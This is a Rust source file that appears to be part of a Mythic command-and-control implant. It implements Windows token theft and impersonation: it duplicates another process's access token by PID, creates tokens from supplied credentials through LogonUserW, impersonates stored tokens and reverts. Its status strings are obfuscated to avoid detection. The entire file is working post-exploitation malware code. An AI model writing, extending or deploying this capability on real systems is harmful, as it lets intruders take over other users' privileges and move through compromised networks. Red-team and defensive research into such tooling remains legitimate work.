use crate::{AgentTask, mythic_success, mythic_error};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::sync::Mutex;

#[cfg(target_os = "windows")]
use winapi::um::{
    handleapi::CloseHandle,
    processthreadsapi::{OpenProcess, OpenProcessToken},
    securitybaseapi::{DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf},
    winbase::{LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT},
    winnt::{
        SecurityImpersonation, TokenPrimary, HANDLE, MAXIMUM_ALLOWED,
        PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE,
    },
};

#[derive(Serialize, Clone)]
struct TokenEntry {
    id: usize,
    #[serde(skip)]
    handle: usize,
    username: String,
    token_type: String,
}

static TOKEN_STORE: Lazy<Mutex<Vec<TokenEntry>>> = Lazy::new(|| Mutex::new(Vec::new()));
static TOKEN_COUNTER: Lazy<Mutex<usize>> = Lazy::new(|| Mutex::new(1));

#[derive(Deserialize)]
struct TokenStealArgs {
    pid: u32,
}

#[derive(Deserialize)]
struct TokenMakeArgs {
    domain: String,
    username: String,
    password: String,
}

#[derive(Deserialize)]
struct TokenUseArgs {
    token_id: usize,
}

pub fn token_list(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let store = TOKEN_STORE.lock().unwrap();
    let tokens: Vec<_> = store.iter().map(|t| {
        serde_json::json!({
            "id": t.id,
            "username": t.username,
            "type": t.token_type,
        })
    }).collect();

    let output = if tokens.is_empty() {
        crate::obfstr::d(crate::obfstr::S_TOKEN_LIST_EMPTY)
    } else {
        serde_json::to_string_pretty(&tokens)?
    };

    Ok(mythic_success!(task.id, output))
}

#[cfg(target_os = "windows")]
pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenStealArgs = serde_json::from_str(&task.parameters)?;

    unsafe {
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, args.pid);
        if process_handle.is_null() {
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN), args.pid)));
        }

        let mut token_handle: HANDLE = std::ptr::null_mut();
        if OpenProcessToken(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN), args.pid)));
        }

        let mut duplicated_token: HANDLE = std::ptr::null_mut();
        let result = DuplicateTokenEx(
            token_handle,
            MAXIMUM_ALLOWED,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicated_token,
        );

        CloseHandle(token_handle);
        CloseHandle(process_handle);

        if result == 0 {
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP), args.pid)));
        }

        let mut counter = TOKEN_COUNTER.lock().unwrap();
        let token_id = *counter;
        *counter += 1;
        drop(counter);

        let entry = TokenEntry {
            id: token_id,
            handle: duplicated_token as usize,
            username: format!("pid:{}", args.pid),
            token_type: "stolen".to_string(),
        };

        TOKEN_STORE.lock().unwrap().push(entry);

        Ok(mythic_success!(task.id, format!("{} {} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_STOLEN), args.pid, token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token stealing {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenMakeArgs = serde_json::from_str(&task.parameters)?;

    let domain: Vec<u16> = args.domain.encode_utf16().chain(std::iter::once(0)).collect();
    let username: Vec<u16> = args.username.encode_utf16().chain(std::iter::once(0)).collect();
    let password: Vec<u16> = args.password.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        let mut token_handle: HANDLE = std::ptr::null_mut();
        let result = LogonUserW(
            username.as_ptr(),
            domain.as_ptr(),
            password.as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        );

        if result == 0 {
            return Ok(mythic_error!(task.id, format!("{} {}\\{}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_CREATE), args.domain, args.username)));
        }

        let mut counter = TOKEN_COUNTER.lock().unwrap();
        let token_id = *counter;
        *counter += 1;
        drop(counter);

        let entry = TokenEntry {
            id: token_id,
            handle: token_handle as usize,
            username: format!("{}\\{}", args.domain, args.username),
            token_type: "created".to_string(),
        };

        TOKEN_STORE.lock().unwrap().push(entry);

        Ok(mythic_success!(task.id, format!("{} {}\\{} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_CREATED), args.domain, args.username, token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token creation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenUseArgs = serde_json::from_str(&task.parameters)?;

    let store = TOKEN_STORE.lock().unwrap();
    let entry = store.iter().find(|t| t.id == args.token_id);

    match entry {
        Some(token) => {
            let handle = token.handle as HANDLE;
            let username = token.username.clone();
            drop(store);

            unsafe {
                if ImpersonateLoggedOnUser(handle) == 0 {
                    return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP), args.token_id)));
                }
            }

            Ok(mythic_success!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_TOKEN_IMPERSONATE), username)))
        }
        None => Ok(mythic_error!(task.id, format!("{} {} not found", crate::obfstr::d(crate::obfstr::S_TOKEN_NOT_FOUND), args.token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token impersonation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    unsafe {
        if RevertToSelf() == 0 {
            return Ok(mythic_error!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT)));
        }
    }

    Ok(mythic_success!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_REVERT)))
}

#[cfg(not(target_os = "windows"))]
pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token revert {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn clear_all_tokens() -> usize {
    let mut store = TOKEN_STORE.lock().unwrap();
    unsafe {
        for entry in store.iter() {
            CloseHandle(entry.handle as HANDLE);
        }
    }
    let count = store.len();
    store.clear();
    count
}

#[cfg(not(target_os = "windows"))]
pub fn clear_all_tokens() -> usize {
    let mut store = TOKEN_STORE.lock().unwrap();
    let count = store.len();
    store.clear();
    count
}
